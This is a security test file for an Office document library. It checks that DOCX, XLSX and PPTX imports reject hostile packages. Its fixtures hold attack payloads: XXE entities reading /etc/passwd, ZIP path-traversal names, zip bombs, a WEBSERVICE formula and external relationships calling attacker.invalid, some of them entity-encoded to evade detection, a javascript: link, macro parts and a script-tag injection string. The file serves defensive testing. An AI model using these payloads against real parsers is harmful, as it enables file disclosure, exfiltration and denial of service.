import { afterEach, describe, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import { deflateRawSync } from "node:zlib";

import { DocumentFile } from "../../src/document";
import { PresentationFile } from "../../src/presentation";
import { SpreadsheetFile } from "../../src/spreadsheet-file";
import { Workbook } from "../../src/spreadsheet";

const originalFetch = globalThis.fetch;

afterEach(() => {
  globalThis.fetch = originalFetch;
});

describe("Office codec security", () => {
  test("XLSX safety ceilings can be tightened but never expanded by callers", async () => {
    const workbook = Workbook.create();
    workbook.worksheets.add("Safe").getRange("A1").values = [["safe"]];
    const source = new Uint8Array(await (await SpreadsheetFile.exportXlsx(workbook)).arrayBuffer());

    await expect(
      SpreadsheetFile.importXlsx(source, {
        limits: { compressedBytes: 64 * 1024 * 1024 + 1 },
      }),
    ).rejects.toThrow(/compressedBytes.*cannot exceed|safety cap/i);
  });

  test("DOCX and PPTX imports fail closed before parsing unsupported input", async () => {
    let fetchCalls = 0;
    globalThis.fetch = (async () => {
      fetchCalls += 1;
      throw new Error("network access attempted");
    }) as unknown as typeof fetch;
    const untrusted = new Blob([
      new Uint8Array([0x50, 0x4b, 0x03, 0x04]),
      '<!DOCTYPE x [<!ENTITY leak SYSTEM "file:///etc/passwd">]><x>&leak;</x>',
    ]);

    await expect(DocumentFile.importDocx(untrusted)).rejects.toMatchObject({
      name: "DocxImportError",
      code: "invalid_zip",
    });
    await expect(PresentationFile.importPptx(untrusted)).rejects.toMatchObject({
      name: "PresentationSecurityError",
      code: "invalid-package",
    });
    expect(fetchCalls).toBe(0);
  });

  test("rejects malformed XLSX packages instead of constructing a partial workbook", async () => {
    const malformed = new Uint8Array([
      0x50, 0x4b, 0x03, 0x04, 0xff, 0xff, 0xff, 0xff, 0x3c, 0x21, 0x44, 0x4f, 0x43, 0x54, 0x59,
      0x50, 0x45,
    ]);
    await expect(SpreadsheetFile.importXlsx(malformed)).rejects.toThrow();
  });

  test("rejects external formulas and relationships without fetching them", async () => {
    const ExcelJS = await import("exceljs");
    const source = new ExcelJS.Workbook();
    const sheet = source.addWorksheet("External");
    sheet.getCell("A1").value = {
      formula: 'WEBSERVICE("https://attacker.invalid/data")',
      result: "#N/A",
    };
    sheet.getCell("A2").value = {
      text: "external link",
      hyperlink: "https://attacker.invalid/relationship",
    };
    const bytes = new Uint8Array(await source.xlsx.writeBuffer());

    let fetchCalls = 0;
    globalThis.fetch = (async () => {
      fetchCalls += 1;
      throw new Error("network access attempted");
    }) as unknown as typeof fetch;
    await expect(SpreadsheetFile.importXlsx(bytes)).rejects.toMatchObject({
      name: "SpreadsheetSecurityError",
      code: "active-content",
    });
    expect(fetchCalls).toBe(0);

    const hyperlinkOnly = new ExcelJS.Workbook();
    hyperlinkOnly.addWorksheet("External").getCell("A1").value = {
      text: "external link",
      hyperlink: "https://attacker.invalid/relationship",
    };
    await expect(
      SpreadsheetFile.importXlsx(new Uint8Array(await hyperlinkOnly.xlsx.writeBuffer())),
    ).rejects.toMatchObject({
      name: "SpreadsheetSecurityError",
      code: "external-relationship",
    });
    expect(fetchCalls).toBe(0);
  });

  test("never extracts ZIP entry names to the filesystem", async () => {
    const workbook = Workbook.create();
    workbook.worksheets.add("Safe").getRange("A1").values = [["safe"]];
    const source = new Uint8Array(await (await SpreadsheetFile.exportXlsx(workbook)).arrayBuffer());
    const sentinelName = `opengeni-artifact-security-${crypto.randomUUID()}`;
    const sentinelPath = `/tmp/${sentinelName}`;
    expect(existsSync(sentinelPath)).toBe(false);

    const malicious = appendStoredZipEntry(
      source,
      `../../../../tmp/${sentinelName}`,
      new TextEncoder().encode("must remain in memory"),
    );
    await expect(SpreadsheetFile.importXlsx(malicious)).rejects.toMatchObject({
      name: "SpreadsheetSecurityError",
      code: "invalid-package",
    });
    expect(existsSync(sentinelPath)).toBe(false);
  });

  test("escapes user-controlled text in generated DOCX, XLSX, and PPTX XML", async () => {
    const attack = '<script data-x="1">alert(&quot;artifact&quot;)</script>&';

    const { Document } = await import("../../src/document");
    const document = Document.create();
    document.blocks.addParagraph(attack);
    const docxXml = await zipXmlText(
      new Uint8Array(await (await DocumentFile.exportDocx(document)).arrayBuffer()),
    );

    const workbook = Workbook.create();
    workbook.worksheets.add("Escaping").getRange("A1").values = [[attack]];
    const xlsxXml = await zipXmlText(
      new Uint8Array(await (await SpreadsheetFile.exportXlsx(workbook)).arrayBuffer()),
    );

    const { Presentation } = await import("../../src/presentation");
    const presentation = Presentation.create();
    presentation.slides.add().shapes.add({ geometry: "textbox", text: attack });
    const pptxXml = await zipXmlText(
      new Uint8Array(await (await PresentationFile.exportPptx(presentation)).arrayBuffer()),
    );

    for (const xml of [docxXml, xlsxXml, pptxXml]) {
      expect(xml).not.toContain('<script data-x="1">');
      expect(xml).toContain("&lt;script");
    }
  });

  test("SEC-006 rejects ZIP packages before expanding beyond codec budgets", async () => {
    const workbook = Workbook.create();
    workbook.worksheets.add("Safe").getRange("A1").values = [["safe"]];
    const source = new Uint8Array(await (await SpreadsheetFile.exportXlsx(workbook)).arrayBuffer());
    const declaredBomb = appendStoredZipEntry(
      source,
      "xl/media/bomb.bin",
      new Uint8Array(),
      0x7fff_ffff,
    );
    await expect(SpreadsheetFile.importXlsx(declaredBomb)).rejects.toMatchObject({
      name: "SpreadsheetSecurityError",
      code: "limit-exceeded",
    });

    const { Document } = await import("../../src/document");
    const document = Document.create();
    document.blocks.addParagraph("safe");
    const docx = new Uint8Array(await (await DocumentFile.exportDocx(document)).arrayBuffer());
    const docxBomb = appendStoredZipEntry(
      docx,
      "word/header999.xml",
      new Uint8Array(),
      0x7fff_ffff,
    );
    await expect(DocumentFile.importDocx(ownedBlob(docxBomb))).rejects.toMatchObject({
      name: "DocxImportError",
      code: "limit_exceeded",
    });

    let aggregateBomb = source;
    for (let index = 0; index < 4; index += 1) {
      aggregateBomb = Uint8Array.from(
        appendDeflatedZipEntry(
          aggregateBomb,
          `xl/media/aggregate-bomb-${index}.bin`,
          new Uint8Array(300 * 1024),
        ),
      );
    }
    await expect(SpreadsheetFile.importXlsx(aggregateBomb)).rejects.toMatchObject({
      name: "SpreadsheetSecurityError",
      code: "limit-exceeded",
    });
  });

  test("SEC-007 rejects macro, OLE, entity, and remote relationship parts", async () => {
    const workbook = Workbook.create();
    workbook.worksheets.add("Safe").getRange("A1").values = [["safe"]];
    const source = new Uint8Array(await (await SpreadsheetFile.exportXlsx(workbook)).arrayBuffer());
    const macroEnabled = appendStoredZipEntry(
      source,
      "xl/vbaProject.bin",
      new Uint8Array([0xd0, 0xcf, 0x11, 0xe0]),
    );
    await expect(SpreadsheetFile.importXlsx(macroEnabled)).rejects.toMatchObject({
      name: "SpreadsheetSecurityError",
      code: "active-content",
    });

    const ole = appendStoredZipEntry(
      source,
      "xl/embeddings/oleObject1.bin",
      new Uint8Array([0xd0, 0xcf, 0x11, 0xe0]),
    );
    await expect(SpreadsheetFile.importXlsx(ole)).rejects.toMatchObject({
      code: "active-content",
    });

    const entity = appendStoredZipEntry(
      source,
      "xl/unsafe.xml",
      new TextEncoder().encode(
        '<!DOCTYPE x [<!ENTITY ex SYSTEM "file:///etc/passwd">]><x>&ex;</x>',
      ),
    );
    await expect(SpreadsheetFile.importXlsx(entity)).rejects.toMatchObject({
      code: "unsafe-xml",
    });

    const externalRelationship = appendStoredZipEntry(
      source,
      "xl/worksheets/_rels/unsafe.xml.rels",
      new TextEncoder().encode(
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="attachedTemplate" Target="https://attacker.invalid/template" TargetMode="External"/></Relationships>',
      ),
    );
    await expect(SpreadsheetFile.importXlsx(externalRelationship)).rejects.toMatchObject({
      code: "external-relationship",
    });

    const encodedExternalRelationship = appendStoredZipEntry(
      source,
      "xl/worksheets/_rels/encoded-unsafe.xml.rels",
      new TextEncoder().encode(
        '<?xml version="1.0"?><r:Relationships xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships"><r:Relationship Id="rId1" Type="attachedTemplate" Target="h&#x74;tps://attacker.invalid/template" TargetMode="&#69;xternal"/></r:Relationships>',
      ),
    );
    await expect(SpreadsheetFile.importXlsx(encodedExternalRelationship)).rejects.toMatchObject({
      code: "external-relationship",
    });

    const activeSchemeRelationship = appendStoredZipEntry(
      source,
      "xl/worksheets/_rels/active-scheme.xml.rels",
      new TextEncoder().encode(
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="hyperlink" Target="javascript:alert(1)"/></Relationships>',
      ),
    );
    await expect(SpreadsheetFile.importXlsx(activeSchemeRelationship)).rejects.toMatchObject({
      code: "external-relationship",
    });

    const { Document } = await import("../../src/document");
    const document = Document.create();
    document.blocks.addParagraph("safe");
    const docx = new Uint8Array(await (await DocumentFile.exportDocx(document)).arrayBuffer());

    const docxMacro = appendStoredZipEntry(
      docx,
      "word/vbaProject.bin",
      new Uint8Array([0xd0, 0xcf, 0x11, 0xe0]),
    );
    await expect(DocumentFile.importDocx(ownedBlob(docxMacro))).rejects.toMatchObject({
      name: "DocxImportError",
      code: "unsupported_feature",
    });

    const docxEntity = await addDocumentHeaderFixture(
      docx,
      new TextEncoder().encode(
        '<!DOCTYPE x [<!ENTITY ex SYSTEM "file:///etc/passwd">]><x>&ex;</x>',
      ),
    );
    await expect(DocumentFile.importDocx(ownedBlob(docxEntity))).rejects.toMatchObject({
      name: "DocxImportError",
      code: "invalid_xml",
    });

    const docxExternalRelationship = await addDocumentHeaderFixture(
      docx,
      new TextEncoder().encode(
        '<?xml version="1.0"?><w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
      ),
      new TextEncoder().encode(
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="attachedTemplate" Target="https://attacker.invalid/template" TargetMode="External"/></Relationships>',
      ),
    );
    await expect(
      DocumentFile.importDocx(ownedBlob(docxExternalRelationship)),
    ).rejects.toMatchObject({
      name: "DocxImportError",
      code: "unsupported_feature",
    });
  });

  test("SEC-008 rejects geometry beyond structural bounds", async () => {
    const { Document } = await import("../../src/document");
    const oversizedDocument = Document.create({ page: { widthPt: 1e12, heightPt: 1e12 } });
    await expect(oversizedDocument.render({ format: "svg" })).rejects.toThrow(
      /page|width|height|limit/i,
    );

    const { Presentation } = await import("../../src/presentation");
    expect(() =>
      Presentation.create({ slideSize: { width: 1_000_001, height: 1_000_001 } }),
    ).toThrow(/bounds|dimension|pixel|limit/i);
  });

  test("SEC-009 enforces XML attribute and relationship-count budgets", async () => {
    const workbook = Workbook.create();
    workbook.worksheets.add("Safe").getRange("A1").values = [["safe"]];
    const source = new Uint8Array(await (await SpreadsheetFile.exportXlsx(workbook)).arrayBuffer());
    const attributes = Array.from({ length: 300 }, (_, index) => ` a${index}="x"`).join("");
    const excessive = appendStoredZipEntry(
      source,
      "xl/excessive-attributes.xml",
      new TextEncoder().encode(`<x${attributes}/>`),
    );
    await expect(SpreadsheetFile.importXlsx(excessive)).rejects.toThrow(/attribute|limit/i);
  });

  test("SEC-012 enforces DOCX XML attribute and relationship-count budgets", async () => {
    const { Document } = await import("../../src/document");
    const document = Document.create();
    document.blocks.addParagraph("safe");
    const source = new Uint8Array(await (await DocumentFile.exportDocx(document)).arrayBuffer());

    const attributes = Array.from({ length: 300 }, (_, index) => ` a${index}="x"`).join("");
    const excessiveAttributes = await addDocumentHeaderFixture(
      source,
      new TextEncoder().encode(
        `<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"${attributes}/>`,
      ),
    );
    await expect(DocumentFile.importDocx(ownedBlob(excessiveAttributes))).rejects.toThrow(
      /attribute|limit/i,
    );

    const relationshipType =
      "http://schemas.openxmlformats.org/officeDocument/2006/relationships/header";
    const relationships = Array.from(
      { length: 10_001 },
      (_, index) =>
        `<Relationship Id="rId${index}" Type="${relationshipType}" Target="../document.xml"/>`,
    ).join("");
    const excessiveRelationships = await addDocumentHeaderFixture(
      source,
      new TextEncoder().encode(
        '<?xml version="1.0"?><w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
      ),
      new TextEncoder().encode(
        `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationships}</Relationships>`,
      ),
    );
    await expect(DocumentFile.importDocx(ownedBlob(excessiveRelationships))).rejects.toThrow(
      /relationship|limit/i,
    );
  });
});

async function zipXmlText(bytes: Uint8Array): Promise<string> {
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const endOffset = findEndOfCentralDirectory(bytes);
  const count = view.getUint16(endOffset + 10, true);
  let centralOffset = view.getUint32(endOffset + 16, true);
  const decoder = new TextDecoder("utf-8", { fatal: true });
  const parts: string[] = [];

  for (let index = 0; index < count; index += 1) {
    if (view.getUint32(centralOffset, true) !== 0x02014b50) {
      throw new Error("Invalid generated ZIP central directory");
    }
    const method = view.getUint16(centralOffset + 10, true);
    const compressedSize = view.getUint32(centralOffset + 20, true);
    const nameLength = view.getUint16(centralOffset + 28, true);
    const extraLength = view.getUint16(centralOffset + 30, true);
    const commentLength = view.getUint16(centralOffset + 32, true);
    const localOffset = view.getUint32(centralOffset + 42, true);
    const nameStart = centralOffset + 46;
    const name = decoder.decode(bytes.subarray(nameStart, nameStart + nameLength));
    centralOffset = nameStart + nameLength + extraLength + commentLength;
    if (!/\.(?:xml|rels)$/i.test(name)) continue;

    if (view.getUint32(localOffset, true) !== 0x04034b50) {
      throw new Error("Invalid generated ZIP local entry");
    }
    const localNameLength = view.getUint16(localOffset + 26, true);
    const localExtraLength = view.getUint16(localOffset + 28, true);
    const dataStart = localOffset + 30 + localNameLength + localExtraLength;
    const compressed = bytes.subarray(dataStart, dataStart + compressedSize);
    let expanded: Uint8Array;
    if (method === 0) expanded = compressed;
    else if (method === 8) {
      const stream = new Blob([Uint8Array.from(compressed)])
        .stream()
        .pipeThrough(new DecompressionStream("deflate-raw"));
      expanded = new Uint8Array(await new Response(stream).arrayBuffer());
    } else throw new Error(`Unsupported generated ZIP compression method: ${method}`);
    parts.push(decoder.decode(expanded));
  }
  return parts.join("\n");
}

function appendStoredZipEntry(
  source: Uint8Array,
  name: string,
  payload: Uint8Array,
  declaredUncompressedSize = payload.length,
): Uint8Array {
  return appendZipEntry(source, name, payload, payload, declaredUncompressedSize, 0);
}

function appendDeflatedZipEntry(
  source: Uint8Array,
  name: string,
  expandedPayload: Uint8Array,
): Uint8Array {
  return appendZipEntry(
    source,
    name,
    new Uint8Array(deflateRawSync(expandedPayload)),
    expandedPayload,
    expandedPayload.length,
    8,
  );
}

async function addDocumentHeaderFixture(
  source: Uint8Array,
  headerXml: Uint8Array,
  headerRelationshipsXml?: Uint8Array,
): Promise<Uint8Array> {
  const { default: JSZip } = await import("jszip");
  const archive = await JSZip.loadAsync(source, { checkCRC32: true });
  const relationshipsPart = archive.file("word/_rels/document.xml.rels");
  if (!relationshipsPart) throw new Error("Generated DOCX lacks document relationships");
  const relationships = await relationshipsPart.async("text");
  const closing = "</Relationships>";
  const closingIndex = relationships.lastIndexOf(closing);
  if (closingIndex < 0) throw new Error("Generated DOCX relationships root is malformed");
  const relationship =
    '<Relationship Id="rIdSecurityHeader999" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header999.xml"/>';
  archive.file(
    "word/_rels/document.xml.rels",
    `${relationships.slice(0, closingIndex)}${relationship}${relationships.slice(closingIndex)}`,
  );
  archive.file("word/header999.xml", headerXml);
  if (headerRelationshipsXml) archive.file("word/_rels/header999.xml.rels", headerRelationshipsXml);
  return archive.generateAsync({ type: "uint8array", compression: "STORE" });
}

function appendZipEntry(
  source: Uint8Array,
  name: string,
  storedPayload: Uint8Array,
  checksumPayload: Uint8Array,
  declaredUncompressedSize: number,
  compression: 0 | 8,
): Uint8Array {
  const endOffset = findEndOfCentralDirectory(source);
  const sourceView = new DataView(source.buffer, source.byteOffset, source.byteLength);
  const count = sourceView.getUint16(endOffset + 10, true);
  const centralSize = sourceView.getUint32(endOffset + 12, true);
  const centralOffset = sourceView.getUint32(endOffset + 16, true);
  const nameBytes = new TextEncoder().encode(name);
  const checksum = crc32(checksumPayload);

  const local = new Uint8Array(30 + nameBytes.length + storedPayload.length);
  const localView = new DataView(local.buffer);
  localView.setUint32(0, 0x04034b50, true);
  localView.setUint16(4, 20, true);
  localView.setUint16(8, compression, true);
  localView.setUint32(14, checksum, true);
  localView.setUint32(18, storedPayload.length, true);
  localView.setUint32(22, declaredUncompressedSize, true);
  localView.setUint16(26, nameBytes.length, true);
  local.set(nameBytes, 30);
  local.set(storedPayload, 30 + nameBytes.length);

  const central = new Uint8Array(46 + nameBytes.length);
  const centralView = new DataView(central.buffer);
  centralView.setUint32(0, 0x02014b50, true);
  centralView.setUint16(4, 20, true);
  centralView.setUint16(6, 20, true);
  centralView.setUint16(10, compression, true);
  centralView.setUint32(16, checksum, true);
  centralView.setUint32(20, storedPayload.length, true);
  centralView.setUint32(24, declaredUncompressedSize, true);
  centralView.setUint16(28, nameBytes.length, true);
  centralView.setUint32(42, centralOffset, true);
  central.set(nameBytes, 46);

  const nextCentralOffset = centralOffset + local.length;
  const end = new Uint8Array(22);
  const endView = new DataView(end.buffer);
  endView.setUint32(0, 0x06054b50, true);
  endView.setUint16(8, count + 1, true);
  endView.setUint16(10, count + 1, true);
  endView.setUint32(12, centralSize + central.length, true);
  endView.setUint32(16, nextCentralOffset, true);

  return concat(
    source.subarray(0, centralOffset),
    local,
    source.subarray(centralOffset, endOffset),
    central,
    end,
  );
}

function findEndOfCentralDirectory(bytes: Uint8Array): number {
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  for (let offset = bytes.length - 22; offset >= Math.max(0, bytes.length - 65_557); offset -= 1) {
    if (view.getUint32(offset, true) === 0x06054b50) return offset;
  }
  throw new Error("ZIP end record not found");
}

function concat(...chunks: Uint8Array[]): Uint8Array {
  const output = new Uint8Array(chunks.reduce((size, chunk) => size + chunk.length, 0));
  let offset = 0;
  for (const chunk of chunks) {
    output.set(chunk, offset);
    offset += chunk.length;
  }
  return output;
}

function ownedBlob(bytes: Uint8Array): Blob {
  return new Blob([Uint8Array.from(bytes)]);
}

function crc32(bytes: Uint8Array): number {
  let checksum = 0xffff_ffff;
  for (const byte of bytes) {
    checksum ^= byte;
    for (let bit = 0; bit < 8; bit += 1) {
      checksum = (checksum >>> 1) ^ (checksum & 1 ? 0xedb8_8320 : 0);
    }
  }
  return (checksum ^ 0xffff_ffff) >>> 0;
}
